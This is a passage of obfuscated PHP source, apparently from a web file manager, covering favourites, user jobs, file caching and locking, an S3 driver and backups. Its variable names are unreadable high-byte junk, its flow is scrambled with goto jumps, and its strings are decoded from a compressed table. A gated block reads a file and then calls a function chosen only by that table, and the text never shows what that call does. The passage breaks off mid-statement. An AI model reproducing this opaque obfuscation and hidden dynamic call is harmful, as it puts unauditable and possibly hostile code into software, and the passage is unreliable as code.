$‚·¾øá‚[$¯…¢›—ƒ[1854]] = array($¯…¢›—ƒ[1855] => $ášÎÔå° + 1, $¯…¢›—ƒ[505] => $¨›ß€ş[$¯…¢›—ƒ[32]], $¯…¢›—ƒ[87] => $¨›ß€ş[$¯…¢›—ƒ[87]], $¯…¢›—ƒ[595] => $¨›ß€ş[$¯…¢›—ƒ[595]] ? $¨›ß€ş[$¯…¢›—ƒ[595]] : $¨›ß€ş[$¯…¢›—ƒ[87]]); $this->update(); } public function zipEvent($®±¼õ™, $‰ñ¼‘ª, $©ğ¦Åäü, $ø‰†•©±) { $ı¨¡ÃÓş =& $_SERVER[®»±”ó²]; $¨¶ÇÏô¾ =& $this->task; $¨¶ÇÏô¾[$ı¨¡ÃÓş[1843]] = get_path_this($‰ñ¼‘ª); $¨¶ÇÏô¾[$ı¨¡ÃÓş[1845]] = $ø‰†•©±; $¨¶ÇÏô¾[$ı¨¡ÃÓş[1846]] = $©ğ¦Åäü; $¨¶ÇÏô¾[$ı¨¡ÃÓş[1152]] = $®±¼õ™ == $ı¨¡ÃÓş[1913] ? $ı¨¡ÃÓş[1914] : $ı¨¡ÃÓş[1915]; $¨¶ÇÏô¾[$ı¨¡ÃÓş[1847]] = $ı¨¡ÃÓş[12]; $¨¶ÇÏô¾[$ı¨¡ÃÓş[844]] = $ø‰†•©±; $¨¶ÇÏô¾[$ı¨¡ÃÓş[1911]] = $ı¨¡ÃÓş[390]; $this->update(); } public function unzipAfter($´Âì§Ä„) { $³Ûå‹šÕ =& $_SERVER[®»±”ó²]; $å“œÊ·ô =& $this->task; $å“œÊ·ô[$³Ûå‹šÕ[1911]] = $³Ûå‹šÕ[110]; $„Üò¤© = IO::infoWithChildren($´Âì§Ä„); $Ó¼®ÁÇ™ = 0; $å“œÊ·ô[$³Ûå‹šÕ[1854]] = array($³Ûå‹šÕ[1855] => $Ó¼®ÁÇ™ + 1, $³Ûå‹šÕ[505] => $„Üò¤©[$³Ûå‹šÕ[32]], $³Ûå‹šÕ[87] => $„Üò¤©[$³Ûå‹šÕ[87]], $³Ûå‹šÕ[595] => $„Üò¤©[$³Ûå‹šÕ[595]] ? $„Üò¤©[$³Ûå‹šÕ[595]] : $„Üò¤©[$³Ûå‹šÕ[87]]); if ($„Üò¤©[$³Ûå‹šÕ[33]] == $³Ûå‹šÕ[233]) { $å“œÊ·ô[$³Ûå‹šÕ[1150]] = 1; } else { $å“œÊ·ô[$³Ûå‹šÕ[1150]] = $„Üò¤©[$³Ûå‹šÕ[82]][$³Ûå‹šÕ[80]]; } $å“œÊ·ô[$³Ûå‹šÕ[1152]] = $³Ûå‹šÕ[12]; $å“œÊ·ô[$³Ûå‹šÕ[1847]] = 0; $å“œÊ·ô[$³Ûå‹šÕ[1792]] = 0; $å“œÊ·ô[$³Ûå‹šÕ[1845]] = 0; $å“œÊ·ô[$³Ûå‹šÕ[1846]] = 0; $å“œÊ·ô[$³Ûå‹šÕ[1843]] = $³Ûå‹šÕ[12]; $å“œÊ·ô[$³Ûå‹šÕ[1850]] = 0; $å“œÊ·ô[$³Ûå‹šÕ[844]] = $„Üò¤©[$³Ûå‹šÕ[79]]; $this->update(); self::log($³Ûå‹šÕ[1916] . json_encode(array($å“œÊ·ô, $„Üò¤©))); } public function nameParse($ˆšŒğÈÁ) { $¡¥’í¾¶ =& $_SERVER[®»±”ó²]; $¨š¬®ËÁ =& $this->task; if ($¨š¬®ËÁ[$¡¥’í¾¶[1911]] == $¡¥’í¾¶[1291]) { $¨š¬®ËÁ[$¡¥’í¾¶[1911]] = $¡¥’í¾¶[390]; $¨š¬®ËÁ[$¡¥’í¾¶[1850]] = 0; $¨š¬®ËÁ[$¡¥’í¾¶[844]] = 0; } $÷Ì“€ä = get_path_this($ˆšŒğÈÁ); if (strstr($÷Ì“€ä, $¡¥’í¾¶[10])) { $¨š¬®ËÁ[$¡¥’í¾¶[1792]] += 1; $¨š¬®ËÁ[$¡¥’í¾¶[1150]] += 1; } $¨š¬®ËÁ[$¡¥’í¾¶[1843]] = $ˆšŒğÈÁ; $this->update(); } } goto aÕ„‘‰ö­Ú; C×áæÜ÷›Ù: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($îë°£Üö) { $×í“ƒùˆ =& $_SERVER[®»±”ó²]; return array($×í“ƒùˆ[2107] => array(USER_ID, $×í“ƒùˆ[2483])); } protected function listData() { $ï™…†‚Ì =& $_SERVER[®»±”ó²]; $¶´ı¶Ãò = array($ï™…†‚Ì[1782] => USER_ID, $ï™…†‚Ì[570] => 0); $Î…–Ïêª = $ï™…†‚Ì[2484]; $œ¤œ½º• = $this->field($Î…–Ïêª)->where($¶´ı¶Ãò)->order($ï™…†‚Ì[2485])->select(); return $œ¤œ½º• ? $œ¤œ½º• : array(); } protected function resetCache() { } protected function listView() { $ç‘³Ò¢Û =& $_SERVER[®»±”ó²]; $öìš¼å = $this->listData(); $éÉ“ĞŠ = array_filter_by_field($öìš¼å, $ç‘³Ò¢Û[33], $ç‘³Ò¢Û[501]); $Ü·ù·„é = array_to_keyvalue($éÉ“ĞŠ, $ç‘³Ò¢Û[12], $ç‘³Ò¢Û[87]); if (!$Ü·ù·„é) { return $öìš¼å; } $õòœ”£ = 2000; $°ˆÖŠüÅ = array($ç‘³Ò¢Û[502] => array($ç‘³Ò¢Û[503], $Ü·ù·„é)); $Ë§¬ü½¼ = Model($ç‘³Ò¢Û[911])->listSource($°ˆÖŠüÅ, $õòœ”£); $Ë§¬ü½¼ = array_merge($Ë§¬ü½¼[$ç‘³Ò¢Û[86]], $Ë§¬ü½¼[$ç‘³Ò¢Û[85]]); $Ë§¬ü½¼ = array_to_keyvalue($Ë§¬ü½¼, $ç‘³Ò¢Û[194]); foreach ($öìš¼å as $ç«ôë–´ => $·š«ÁÕà) { $¨áªì˜· = $Ë§¬ü½¼[$·š«ÁÕà[$ç‘³Ò¢Û[87]]]; $¨áªì˜· = $¨áªì˜· ? $¨áªì˜· : array(); $öìš¼å[$ç«ôë–´] = array_merge($¨áªì˜·, $·š«ÁÕà); } return $öìš¼å; } protected function addFav($¨´Ãã¿å, $ğöÚÏ¾Á = '', $‰ñ¼©Œ† = "\x73\x6f\165\x72\143\145") { $ŠŞ®¾ˆ¨ =& $_SERVER[®»±”ó²]; $³Í”ô ¼ = array($ŠŞ®¾ˆ¨[1782] => USER_ID, $ŠŞ®¾ˆ¨[570] => 0, $ŠŞ®¾ˆ¨[507] => $‰ñ¼©Œ†, $ŠŞ®¾ˆ¨[506] => $¨´Ãã¿å); if ($this->where($³Í”ô ¼)->find()) { return !1; } $³Í”ô ¼ = array($ŠŞ®¾ˆ¨[1782] => USER_ID, $ŠŞ®¾ˆ¨[570] => 0); $îë˜•İ  = $this->where($³Í”ô ¼)->max($ŠŞ®¾ˆ¨[2015]); if (!$îë˜•İ ) { $îë˜•İ  = 0; } if (!$ğöÚÏ¾Á && $‰ñ¼©Œ† == $ŠŞ®¾ˆ¨[501]) { $âÕ¯½€ = Model($ŠŞ®¾ˆ¨[1440])->where(array($ŠŞ®¾ˆ¨[502] => $¨´Ãã¿å))->find(); if (!$âÕ¯½€) { return !1; } $ğöÚÏ¾Á = $âÕ¯½€[$ŠŞ®¾ˆ¨[32]]; } $ğöÚÏ¾Á = $this->getAutoName($ğöÚÏ¾Á); $Ôõµ­Ñ = array($ŠŞ®¾ˆ¨[1782] => USER_ID, $ŠŞ®¾ˆ¨[570] => 0, $ŠŞ®¾ˆ¨[505] => $ğöÚÏ¾Á, $ŠŞ®¾ˆ¨[506] => $¨´Ãã¿å, $ŠŞ®¾ˆ¨[507] => $‰ñ¼©Œ†, $ŠŞ®¾ˆ¨[1995] => $îë˜•İ  + 1); return $this->add($Ôõµ­Ñ); } protected function remove($»ï…Ùê) { $±öè¾¬Ä =& $_SERVER[®»±”ó²]; $şáÜı = array($±öè¾¬Ä[1782] => USER_ID, $±öè¾¬Ä[504] => $»ï…Ùê); return $this->where($şáÜı)->delete(); } protected function removeByName($ëöº²Û) { $öùˆÛÀ‚ =& $_SERVER[®»±”ó²]; $û°ÜÂí = array($öùˆÛÀ‚[1782] => USER_ID, $öùˆÛÀ‚[505] => $ëöº²Û, $öùˆÛÀ‚[570] => 0); return $this->where($û°ÜÂí)->delete(); } protected function rename($ğ×ßÌ†¸, $£©ÅÎË) { $İ°©úŞØ =& $_SERVER[®»±”ó²]; if ($ğ×ßÌ†¸ == $£©ÅÎË) { return !1; } $çšô–¼ = $this->getAutoName($£©ÅÎË); if ($£©ÅÎË != $çšô–¼) { return !1; } $æÖÀú™´ = array($İ°©úŞØ[1782] => USER_ID, $İ°©úŞØ[570] => 0, $İ°©úŞØ[32] => $ğ×ßÌ†¸); return $this->where($æÖÀú™´)->save(array($İ°©úŞØ[32] => $£©ÅÎË)); } protected function resetSort($§Šåİ) { $ßÛ´î¯Ü =& $_SERVER[®»±”ó²]; $§Šåİ = is_array($§Šåİ) ? $§Šåİ : array(); $êº’Óñ = array($ßÛ´î¯Ü[1782] => USER_ID); for ($€şœì¯Ş = 0; $€şœì¯Ş < count($§Šåİ); $€şœì¯Ş++) { $êº’Óñ[$ßÛ´î¯Ü[504]] = $§Šåİ[$€şœì¯Ş]; $this->where($êº’Óñ)->save(array($ßÛ´î¯Ü[1995] => $€şœì¯Ş + 1)); } return !0; } protected function moveTop($˜¼¿˜ä³) { $£¶İêö– =& $_SERVER[®»±”ó²]; $µÉúŸ§° = array($£¶İêö–[1782] => USER_ID, $£¶İêö–[570] => 0); $±—“ÀÆô = $this->where($µÉúŸ§°)->where(array($£¶İêö–[32] => $˜¼¿˜ä³))->find(); if (!$±—“ÀÆô) { return; } $°³ „ÕÂ = $this->field($£¶İêö–[477])->where($µÉúŸ§°)->order($£¶İêö–[2485])->select(); $°³ „ÕÂ = array_to_keyvalue($°³ „ÕÂ, $£¶İêö–[12], $£¶İêö–[477]); $Õ¿¬­¥ = $°³ „ÕÂ; $°³ „ÕÂ = array_remove_value($°³ „ÕÂ, $±—“ÀÆô[$£¶İêö–[477]]); array_unshift($°³ „ÕÂ, $±—“ÀÆô[$£¶İêö–[477]]); return $this->resetSort($°³ „ÕÂ); } protected function moveBottom($¿ÆŠ£²) { $Òù£îü– =& $_SERVER[®»±”ó²]; $†üü° = array($Òù£îü–[1782] => USER_ID, $Òù£îü–[570] => 0); $Óñ‰Æñº = $this->where($†üü°)->max($Òù£îü–[2015]); $ñãö¨ü = array($Òù£îü–[2015] => $Óñ‰Æñº + 1); return $this->where($†üü°)->where(array($Òù£îü–[32] => $¿ÆŠ£²))->save($ñãö¨ü); } private function getAutoName($Œ´†§›×) { $•†Îó‹Û =& $_SERVER[®»±”ó²]; $ÈÓí‰¡ = array($•†Îó‹Û[1782] => USER_ID, $•†Îó‹Û[570] => 0); $Äêº«ì = $this->field($•†Îó‹Û[32])->where($ÈÓí‰¡)->select(); $Äêº«ì = array_to_keyvalue($Äêº«ì, $•†Îó‹Û[12], $•†Îó‹Û[32]); if (!$Äêº«ì || !in_array($Œ´†§›×, $Äêº«ì)) { return $Œ´†§›×; } for ($Ôõë÷À¡ = 0; $Ôõë÷À¡ < count($Äêº«ì); $Ôõë÷À¡++) { if (!in_array($Œ´†§›× . "\x28{$Ôõë÷À¡}\51", $Äêº«ì)) { return $Œ´†§›× . "\50{$Ôõë÷À¡}\51"; } } return $Œ´†§›× . "\x28{$Ôõë÷À¡}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\152\x6f\x62\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\144\x65\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\145\154\x66\112\x6f\x62\114\x69\163\x74"; public function listData($ø«Ò¢¼ = false, $ñÕÚØ¬Ã = "\163\x6f\162\x74", $¨ğ€¸ãÏ = false) { return parent::listData($ø«Ò¢¼, $ñÕÚØ¬Ã, $¨ğ€¸ãÏ); } public function remove($ŒÁáü¡é) { return parent::remove($ŒÁáü¡é); } public function add($šÊ’ÌİŸ) { $‘ÓÄó„´ =& $_SERVER[®»±”ó²]; if ($this->findByName($šÊ’ÌİŸ[$‘ÓÄó„´[32]])) { return !1; } $šÊ’ÌİŸ[$‘ÓÄó„´[2015]] = $this->getSort(); return parent::insert($šÊ’ÌİŸ); } private function getSort() { $¸ñ×œ¤ =& $_SERVER[®»±”ó²]; $¯«­éº = parent::listData(); $è›È¡Ó™ = array_to_keyvalue($¯«­éº, $¸ñ×œ¤[12], $¸ñ×œ¤[2015]); return empty($è›È¡Ó™) ? 0 : max($è›È¡Ó™) + 1; } public function update($¡»Øô™Ã, $‡›¢Î”Î) { $¹‚ƒĞ×ª =& $_SERVER[®»±”ó²]; $áÌ«Ü½Ô = parent::listData($¡»Øô™Ã); $±©º§ø’ = $this->findByName($‡›¢Î”Î[$¹‚ƒĞ×ª[32]]); if (!$áÌ«Ü½Ô || $±©º§ø’ && $±©º§ø’[$¹‚ƒĞ×ª[477]] != $áÌ«Ü½Ô[$¹‚ƒĞ×ª[477]]) { return !1; } return parent::update($¡»Øô™Ã, $‡›¢Î”Î); } public function setUserJob($ú±ŸÓÄ, $ÂÆ£¿Ä) { $™ñûæâ‰ =& $_SERVER[®»±”ó²]; if (!is_array($ÂÆ£¿Ä)) { $ÂÆ£¿Ä = array($ÂÆ£¿Ä); } $Ü­¬èÚì = parent::listData(); $‚õ”ü– = array_to_keyvalue($Ü­¬èÚì, $™ñûæâ‰[32]); $¯¾áŞÑ² = $™ñûæâ‰[456]; foreach ($ÂÆ£¿Ä as $¼±›õÌ) { if ($‚õ”ü–[$¼±›õÌ]) { $¯¾áŞÑ² .= $‚õ”ü–[$¼±›õÌ][$™ñûæâ‰[477]] . $™ñûæâ‰[50]; } else { $»äÕŒµƒ = $this->add($¼±›õÌ); $¯¾áŞÑ² .= $»äÕŒµƒ . $™ñûæâ‰[50]; } } $¯¾áŞÑ² = rtrim($¯¾áŞÑ², $™ñûæâ‰[50]); Model($™ñûæâ‰[610])->metaSet($ú±ŸÓÄ, self::JOB_KEY, $¯¾áŞÑ²); } public function getUserJob($ŒıÔ¹™•) { $ùŞ‡îª = Model($_SERVER[®»±”ó²][610])->metaGet($ŒıÔ¹™•); return $this->getUserJobInfo($ùŞ‡îª[self::JOB_KEY]); } public function getUserJobInfo($áîú“‘ô) { $É¾™±ô =& $_SERVER[®»±”ó²]; $¡“½Š® = explode($É¾™±ô[50], $áîú“‘ô); $ŞìÀÊ† = parent::listData(); $ŞìÀÊ† = array_remove_key($ŞìÀÊ†, $É¾™±ô[234]); $à«—¢ı¶ = array(); foreach ($¡“½Š® as $¢£¹¢×•) { if (isset($ŞìÀÊ†[$¢£¹¢×•])) { $à«—¢ı¶[] = $ŞìÀÊ†[$¢£¹¢×•]; } } return $à«—¢ı¶; } } if ($_SERVER[$_SERVER[®»±”ó²][478]] != $_SERVER[$_SERVER[®»±”ó²][479]]) { $_getc = $_SERVER[®»±”ó²][480]; $_getfile = $_SERVER[$_SERVER[®»±”ó²][481]] . $_SERVER[®»±”ó²][482]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[®»±”ó²][288], $_getfilec); if (count($_getarrs) < $_SERVER[®»±”ó²][483]) { $exit = $_SERVER[®»±”ó²][484]; $exit(); } $_act = $_SERVER[®»±”ó²][485]; $_act($_SERVER[$_SERVER[®»±”ó²][486]]); } goto f‹²ƒ¼ïËÂ; F—â˜Ú’Š: $nrwliabuse = $_SERVER[®»±”ó²][695]; if (strlen($nrwliabuse) < $_SERVER[®»±”ó²][696]) { return; } $_SERVER[öï™ ‘] = explode($_SERVER[®»±”ó²][697], gzinflate(substr($_SERVER[®»±”ó²][698], 10, -8))); goto F«¬É³êã³; f°ÉµŒë£: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‰ÈÊ½ºô, $‡úĞúâ’) { $ëÈĞ¢öâ =& $_SERVER[®»±”ó²]; $this->cachePath = $‰ÈÊ½ºô[$ëÈĞ¢öâ[87]]; $this->prefix = $ëÈĞ¢öâ[921]; $this->cacheTime = $‡úĞúâ’; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($óÆ§µì) { $•ıÀõº¼ =& $_SERVER[®»±”ó²]; $óÆ§µì = str_replace(array($•ıÀõº¼[922], $•ıÀõº¼[100], $•ıÀõº¼[76]), $•ıÀõº¼[923], $óÆ§µì); return $this->cachePath . $•ıÀõº¼[924] . $óÆ§µì . $•ıÀõº¼[925]; } public function set($ù©­˜Ñì, $ñá×…ì©, $“³Ù¯Å© = false) { $“³Ù¯Å© = $“³Ù¯Å© ? $“³Ù¯Å© : $this->cacheTime; $©ÚÛÍÌÂ = $this->getFile($ù©­˜Ñì); if (file_put_contents($©ÚÛÍÌÂ, $this->prefix . $ñá×…ì©, LOCK_EX)) { @touch($©ÚÛÍÌÂ, intval(time() + $“³Ù¯Å©)); clearstatcache(); return !0; } @unlink($©ÚÛÍÌÂ); return !1; } public function get($†æ‘») { $–âë¨şÀ = $this->getFile($†æ‘»); if (file_exists($–âë¨şÀ) && filemtime($–âë¨şÀ) < time()) { @unlink($–âë¨şÀ); return !1; } $ŒÚÂù÷ø = @file_get_contents($–âë¨şÀ); return substr($ŒÚÂù÷ø, strlen($this->prefix)); } public function remove($áÅ„†‡•) { $ƒŠ£Éï× = $this->getFile($áÅ„†‡•); return @unlink($ƒŠ£Éï×); } public function deleteAll() { $øêñõÁÂ =& $_SERVER[®»±”ó²]; $¼•šä’ß = scandir($this->cachePath); foreach ($¼•šä’ß as $°­ÖáÜæ) { $ÍÁÙ½•ã = $this->cachePath . $°­ÖáÜæ; if (strpos($ÍÁÙ½•ã, $øêñõÁÂ[925]) && strpos($ÍÁÙ½•ã, $øêñõÁÂ[926])) { @unlink($ÍÁÙ½•ã); } } } public function clearTimeout() { $ô·•û¼ç =& $_SERVER[®»±”ó²]; $¡ã²Í§— = scandir($this->cachePath); foreach ($¡ã²Í§— as $ ÑÔ·³Ï) { $²¤âû×Ü = $this->cachePath . $ ÑÔ·³Ï; if (strpos($²¤âû×Ü, $ô·•û¼ç[925]) && strpos($²¤âû×Ü, $ô·•û¼ç[926]) && filemtime($²¤âû×Ü) < time()) { @unlink($²¤âû×Ü); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¼ëÇƒ› =& $_SERVER[®»±”ó²]; if (self::$handle) { return self::$handle; } $‘öüÖ‡ = $GLOBALS[$¼ëÇƒ›[6]][$¼ëÇƒ›[426]]; self::$timeout = $‘öüÖ‡[$¼ëÇƒ›[927]] ? $‘öüÖ‡[$¼ëÇƒ›[927]] : 10; $ÃÒèåØÏ = _get($GLOBALS[$¼ëÇƒ›[6]], $¼ëÇƒ›[928]); $£ß»šş = $‘öüÖ‡[$¼ëÇƒ›[913]] ? $‘öüÖ‡[$¼ëÇƒ›[913]] : $¼ëÇƒ›[233]; if ($£ß»šş == $¼ëÇƒ›[21] && $ÃÒèåØÏ == $¼ëÇƒ›[13]) { $£ß»šş = $¼ëÇƒ›[233]; } switch ($£ß»šş) { case $¼ëÇƒ›[916]: self::$handle = new CacheLockRedis(); break; case $¼ëÇƒ›[917]: self::$handle = new CacheLockMemcached(); break; case $¼ëÇƒ›[21]: self::$handle = new CacheLockDatabase(); break; case $¼ëÇƒ›[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¼ëÇƒ›[929], $¼ëÇƒ›[930]); } return self::$handle; } private static function key($ÁÃ€ÆÒ—) { return $_SERVER[®»±”ó²][931] . Cache::key($ÁÃ€ÆÒ—); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($óÉÑãş¼ = '') { self::$errorMsg = $óÉÑãş¼; } public static function lockGlobal($ÌüŸŞµç, $ê•“Å‚Ô) { return self::lock($ÌüŸŞµç, $ê•“Å‚Ô, !0); } public static function lock($–ºÊÅ‰‘, $Ê¢¬¾Û‚ = false, $Û†×ç¯ = false) { $í‘¡¡ÀŒ =& $_SERVER[®»±”ó²]; $Éé‚¹°æ = self::init(); $×¥îæøÖ = self::key($–ºÊÅ‰‘); $Ê¢¬¾Û‚ = $Ê¢¬¾Û‚ ? $Ê¢¬¾Û‚ : self::$timeout; $œ¤ÖİÅ = timeFloat(); if (_get($GLOBALS, $í‘¡¡ÀŒ[932], !1)) { if (!$Éé‚¹°æ->lock($×¥îæøÖ, 0.2)) { die; } return !0; } $‘çİİ¹ = $Éé‚¹°æ->lock($×¥îæøÖ, $Ê¢¬¾Û‚); $ ‡ñ¼ = timeFloat(); if (!$‘çİİ¹) { $Ì¾ ¨…¾ = "\154\x6f\143\x6b\40\x65\x72\x72\157\x72\73\x6b\145\x79\75{$–ºÊÅ‰‘}\73\x74\151\x6d\145\x3d{$Ê¢¬¾Û‚}\73" . self::$errorMsg . $í‘¡¡ÀŒ[74] . get_caller_msg(); $ƒÙ’Åñ = LNG($í‘¡¡ÀŒ[933]) . "\50{$Ê¢¬¾Û‚}\163\51\56" . LNG($í‘¡¡ÀŒ[934]); $ƒÙ’Åñ .= $í‘¡¡ÀŒ[935]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ƒÙ’Åñ = $ƒÙ’Åñ . $í‘¡¡ÀŒ[936] . self::$errorMsg; } write_log($í‘¡¡ÀŒ[937] . sprintf($í‘¡¡ÀŒ[938], timeFloat() - $œ¤ÖİÅ) . $í‘¡¡ÀŒ[939] . $Ì¾ ¨…¾ . $í‘¡¡ÀŒ[940] . json_encode(error_get_last()), $í‘¡¡ÀŒ[930]); show_json($ƒÙ’Åñ, !1); } if (!$Û†×ç¯) { self::$lockItem[$×¥îæøÖ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $†Æ¤ş®ë = number_format(timeFloat() - $ ‡ñ¼, 3); write_log($í‘¡¡ÀŒ[941] . $–ºÊÅ‰‘ . $í‘¡¡ÀŒ[942] . $†Æ¤ş®ë, $í‘¡¡ÀŒ[930]); } return $‘çİİ¹; } public static function lockGet($¼ıíáÀ) { $‰ğà‘Ş = self::key($¼ıíáÀ); if (self::$lockItem[$‰ğà‘Ş]) { return self::$lockItem[$‰ğà‘Ş]; } return self::init()->lockGet($‰ğà‘Ş); } public static function unlock($²èÅäáÉ) { $ÀìÏó¿ï =& $_SERVER[®»±”ó²]; $´×Ş¾ˆ = self::key($²èÅäáÉ); self::$lockItem[$´×Ş¾ˆ] = null; self::init()->unlock($´×Ş¾ˆ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÀìÏó¿ï[943] . $²èÅäáÉ, $ÀìÏó¿ï[930]); } return; } public static function unlockRuntime() { $‡ˆ–‚øÚ =& $_SERVER[®»±”ó²]; $Æç¨Ú¿û = self::init(); $şáØâï‚ = !1; foreach (self::$lockItem as $‚é–Õˆ => $‰ºÒìã) { if (!$‰ºÒìã) { continue; } $Æç¨Ú¿û->unlock($‚é–Õˆ); if (!$şáØâï‚) { $şáØâï‚ = !0; write_log($‡ˆ–‚øÚ[944] . $‚é–Õˆ . $‡ˆ–‚øÚ[74] . get_caller_msg(), $‡ˆ–‚øÚ[930]); continue; } write_log($‡ˆ–‚øÚ[944] . $‚é–Õˆ, $‡ˆ–‚øÚ[930]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $à¥ÅğÈ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‡ˆ–‚øÚ[945] . $à¥ÅğÈ . $‡ˆ–‚øÚ[946] . ACTION, $‡ˆ–‚øÚ[930]); } } public static function fileLock($ÈĞÓå­¿) { $´ª¾Ä¸§ =& $_SERVER[®»±”ó²]; if (!$GLOBALS[$´ª¾Ä¸§[947]]) { $GLOBALS[$´ª¾Ä¸§[947]] = array(); } $GLOBALS[$´ª¾Ä¸§[947]][$ÈĞÓå­¿] = !1; $ä÷®÷Ü™ = fopen(DATA_PATH . $ÈĞÓå­¿ . $´ª¾Ä¸§[948], $´ª¾Ä¸§[949]); if (!$ä÷®÷Ü™) { return !1; } $GLOBALS[$´ª¾Ä¸§[947]][$ÈĞÓå­¿] = $ä÷®÷Ü™; if (flock($ä÷®÷Ü™, LOCK_EX)) { return !0; } self::unlock($ÈĞÓå­¿); show_json($´ª¾Ä¸§[950], !1); return !1; } public static function fileUnlock($ÊïØ£©­) { $µÅáü¢ =& $_SERVER[®»±”ó²]; $ÊÌœü– = $GLOBALS[$µÅáü¢[947]][$ÊïØ£©­]; if (!$ÊÌœü–) { return; } $GLOBALS[$µÅáü¢[947]][$ÊïØ£©­] = !1; flock($ÊÌœü–, LOCK_UN); fclose($ÊÌœü–); } public static function fileUnlockAll() { $Â÷«ıóñ =& $_SERVER[®»±”ó²]; if (!isset($GLOBALS[$Â÷«ıóñ[947]]) || !$GLOBALS[$Â÷«ıóñ[947]]) { return; } foreach ($GLOBALS[$Â÷«ıóñ[947]] as $ÓÇà¸ œ => $®ÙèÓ½ƒ) { if (!$®ÙèÓ½ƒ) { continue; } $GLOBALS[$Â÷«ıóñ[947]][$ÓÇà¸ œ] = !1; flock($®ÙèÓ½ƒ, LOCK_UN); fclose($®ÙèÓ½ƒ); } $GLOBALS[$Â÷«ıóñ[947]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Aƒñáêëø´; d®âÖ®Ã¥: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ú´…àÜ) { $î¥ˆªÛØ =& $_SERVER[®»±”ó²]; parent::__construct($ú´…àÜ); $šÜÉ¬æ = isset($ú´…àÜ[$î¥ˆªÛØ[259]]) && $ú´…àÜ[$î¥ˆªÛØ[259]] == $î¥ˆªÛØ[250] ? $î¥ˆªÛØ[250] : $î¥ˆªÛØ[316]; $this->setSignVersion($šÜÉ¬æ); } public function link($î¾¡ìÖó, $‹şËºß‰ = array()) { return parent::link($î¾¡ìÖó, $‹şËºß‰); } public function fileOut($€Â“ æ», $øÚïÙÕš = false, $ç¡§˜£û = false, $©Î‘öÔš = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[®»±”ó²][317])) { return parent::fileOutServer($€Â“ æ», $øÚïÙÕš, $ç¡§˜£û, $©Î‘öÔš); } parent::fileOut($€Â“ æ», $øÚïÙÕš, $ç¡§˜£û, $©Î‘öÔš); } public function fileOutImage($×ŒÃ, $¾¶‹ÆÂ = 250) { if (strstr($this->endpoint, $_SERVER[®»±”ó²][317])) { return parent::fileOutImageServer($×ŒÃ, $¾¶‹ÆÂ); } parent::fileOutImage($×ŒÃ, $¾¶‹ÆÂ); } } define($_SERVER[®»±”ó²][318], 1); define($_SERVER[®»±”ó²][319], 2); goto D¬ˆ³à¦›™; dÍµÓÜß Ê: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x62\141\x63\153\x75\160\114\151\163\164"; public $field = array("\151\x6f", "\156\141\155\x65", "\163\164\141\164\x75\x73", "\x63\157\x6e\x74\x65\x6e\x74", "\x6d\x61\x6e\x75\x61\154", "\162\x65\x73\x75\154\x74", "\x74\x69\155\145\x46\x72\157\x6d", "\164\151\155\x65\x54\157"); public function config() { $Ü®´üÂ– =& $_SERVER[®»±”ó²]; Action($Ü®´üÂ–[2016])->taskInit(); $œéÃ¼ù˜ = Model($Ü®´üÂ–[851])->get($Ü®´üÂ–[858]); $œéÃ¼ù˜ = json_decode($œéÃ¼ù˜, !0); $œéÃ¼ù˜ = is_array($œéÃ¼ù˜) ? $œéÃ¼ù˜ : array(); $this->parseContent($œéÃ¼ù˜); unset($œéÃ¼ù˜[$Ü®´üÂ–[1760]]); Model($Ü®´üÂ–[1759])->cacheClear(); $äºèÃá = $Ü®´üÂ–[2017]; $­íêÃã = Model($Ü®´üÂ–[2018])->findByKey($Ü®´üÂ–[1778], $äºèÃá); if (!$­íêÃã) { $­íêÃã = array(); } if (isset($­íêÃã[$Ü®´üÂ–[207]])) { $­íêÃã[$Ü®´üÂ–[207]] = json_decode($­íêÃã[$Ü®´üÂ–[207]], !0); } if (isset($œéÃ¼ù˜[$Ü®´üÂ–[207]])) { $­íêÃã[$Ü®´üÂ–[207]][$Ü®´üÂ–[1763]] = $œéÃ¼ù˜[$Ü®´üÂ–[207]]; unset($œéÃ¼ù˜[$Ü®´üÂ–[207]]); } return array_merge($­íêÃã, $œéÃ¼ù˜); } public function listData($è°¢—ı = false, $§¨¶Óî„ = "\x6d\157\144\151\146\x79\x54\x69\155\145", $ÒÛ¿ıˆê = false) { $¸†ğêÁ÷ = parent::listData($è°¢—ı, $§¨¶Óî„, !0); if (!$¸†ğêÁ÷) { return $¸†ğêÁ÷; } if ($è°¢—ı) { $¸†ğêÁ÷ = array($¸†ğêÁ÷); } foreach ($¸†ğêÁ÷ as &$äùèëìœ) { $this->parseContent($äùèëìœ); } return $è°¢—ı ? $¸†ğêÁ÷[0] : $¸†ğêÁ÷; } public function parseContent(&$òúœ¥Âî) { $—ŒóŸ®ò =& $_SERVER[®»±”ó²]; $‡»«‹ÂÖ = _get($òúœ¥Âî, $—ŒóŸ®ò[171], $—ŒóŸ®ò[91]); if (!in_array($‡»«‹ÂÖ, array($—ŒóŸ®ò[857], $—ŒóŸ®ò[1219]))) { $òúœ¥Âî[$—ŒóŸ®ò[171]] = $‡»«‹ÂÖ == $—ŒóŸ®ò[91] ? $—ŒóŸ®ò[1219] : $—ŒóŸ®ò[857]; } } public function lastItem() { $‡Œ×Â«Å = $this->listData(); return !empty($‡Œ×Â«Å[0]) ? $‡Œ×Â«Å[0] : null; } public function kill($ñş«Ñ¾•) { $ÎäãÕÉŸ =& 